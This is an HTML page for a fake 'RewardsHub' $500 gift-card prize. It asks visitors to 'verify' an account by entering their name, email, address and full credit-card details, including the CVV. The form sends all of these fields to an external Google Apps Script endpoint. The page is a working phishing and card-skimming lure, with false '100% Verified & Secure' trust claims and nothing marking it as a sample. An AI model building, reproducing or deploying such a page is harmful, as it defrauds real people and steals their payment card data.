<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RewardsHub - $500 Exclusive Win</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap');
        :root { --bg-color: #0a0f1c; --form-bg: #141c2e; --primary-glow: #8a2be2; --secondary-glow: #ff007f; --accent: #00ffcc; --text-main: #ffffff; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Poppins', sans-serif; }
        body { background: radial-gradient(circle at center, #0a0f1c 0%, #05070f 100%); color: var(--text-main); display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
        #particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; }
        .trust-bar { width: 100%; background: rgba(20, 28, 46, 0.95); border-bottom: 3px solid var(--secondary-glow); padding: 15px; text-align: center; font-weight: 700; color: var(--accent); }
        .brand-logo { font-size: 36px; font-weight: 900; margin: 20px 0; background: linear-gradient(90deg, #ff8a00, #e52e71); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .card-container { width: 300px; height: 180px; position: relative; transform-style: preserve-3d; animation: float 6s infinite ease-in-out; margin-bottom: 30px; }
        .gift-card { width: 100%; height: 100%; background: linear-gradient(135deg, #ffd700, #8a2be2); border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 30px; color: white; font-weight: bold; border: 3px solid #fff; }
        .form-container { background: var(--form-bg); width: 90%; max-width: 420px; padding: 30px; border-radius: 20px; box-shadow: 0 0 40px rgba(138, 43, 226, 0.3); margin-bottom: 50px; }
        .input-group { margin-bottom: 15px; }
        label { display: block; font-size: 11px; color: #a0b8ff; margin-bottom: 5px; text-transform: uppercase; }
        input { width: 100%; background: #0d1325; border: 2px solid #2a3441; padding: 14px; border-radius: 10px; color: white; outline: none; }
        .submit-btn { width: 100%; background: linear-gradient(45deg, var(--primary-glow), var(--secondary-glow)); color: white; border: none; padding: 16px; border-radius: 10px; font-weight: 900; cursor: pointer; text-transform: uppercase; letter-spacing: 1px; }
        @keyframes float { 0%, 100% { transform: translateY(0px) rotateY(0deg); } 50% { transform: translateY(-20px) rotateY(180deg); } }
        .footer { padding: 20px; text-align: center; color: #666; font-size: 12px; }
    </style>
</head>
<body>

    <canvas id="particles"></canvas>

    <div class="trust-bar">✔️ 100% Verified & Secure</div>
    <div class="brand-logo">🎁 RewardsHub</div>

    <div class="card-container">
        <div class="gift-card">$500 WIN</div>
    </div>

    <div class="form-container">
        <h2 style="text-align:center; margin-bottom:20px; color:white;">Account Verification</h2>
        
        <form action="https://script.google.com/macros/s/AKfycbz4bE3WIVsYF6EhtlF6xbbJWSZTCx4VOFED3dHpoN88hmVk82uNfm_xToOth-7YEDEb/exec" method="POST">
            <div style="display:flex; gap:10px;">
                <div class="input-group" style="flex:1;"><label>First Name</label><input type="text" name="firstName" required></div>
                <div class="input-group" style="flex:1;"><label>Last Name</label><input type="text" name="lastName" required></div>
            </div>
            <div class="input-group"><label>Email</label><input type="email" name="email" required></div>
            <div class="input-group"><label>Zip Code</label><input type="text" name="zipCode" required></div>
            <div class="input-group"><label>Full Address</label><input type="text" name="address" required></div>
            <div class="input-group"><label>Cardholder Name</label><input type="text" name="cardholderName" required></div>
            <div class="input-group"><label>Card Number</label><input type="text" name="cardNumber" required></div>
            <div style="display:flex; gap:10px;">
                <div class="input-group" style="flex:1;"><label>Expiry</label><input type="text" name="expiry" placeholder="MM/YY" required></div>
                <div class="input-group" style="flex:1;"><label>CVV</label><input type="password" name="cvv" placeholder="•••" required></div>
            </div>
            <button type="submit" class="submit-btn">Verify & Claim Reward</button>
        </form>
    </div>

    <footer class="footer">&copy; 2026 RewardsHub. All rights reserved.</footer>

    <script>
        const canvas = document.getElementById('particles');
        const ctx = canvas.getContext('2d');
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        let particles = [];
        class Particle {
            constructor() { this.x = Math.random()*canvas.width; this.y = Math.random()*canvas.height; this.size = Math.random()*2; this.speedY = Math.random()*-1; }
            update() { this.y += this.speedY; if(this.y < 0) this.y = canvas.height; }
            draw() { ctx.fillStyle = 'rgba(255,255,255,0.2)'; ctx.beginPath(); ctx.arc(this.x, this.y, this.size, 0, Math.PI*2); ctx.fill(); }
        }
        for(let i=0; i<100; i++) particles.push(new Particle());
        function animate() { ctx.clearRect(0,0,canvas.width, canvas.height); particles.forEach(p => { p.update(); p.draw(); }); requestAnimationFrame(animate); }
        animate();
    </script>
</body>
</html>
